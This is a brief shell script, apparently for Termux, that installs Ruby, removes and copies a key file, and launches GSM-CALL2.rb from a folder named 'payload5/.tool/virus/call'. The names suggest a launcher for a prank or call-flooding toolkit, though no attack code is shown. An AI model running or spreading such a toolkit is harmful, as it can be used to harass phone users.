
pkg install ruby -y
gem install colorize
cd
rm -rif ali-max.key
cp $HOME/payload5/.tool/virus/call/ali-max.key $HOME
#cp $HOME/payload5/.tool/virus/call/GSM-CALL.rb $HOME
cd $HOME/payload5/.tool/virus/call/
ruby GSM-CALL2.rb
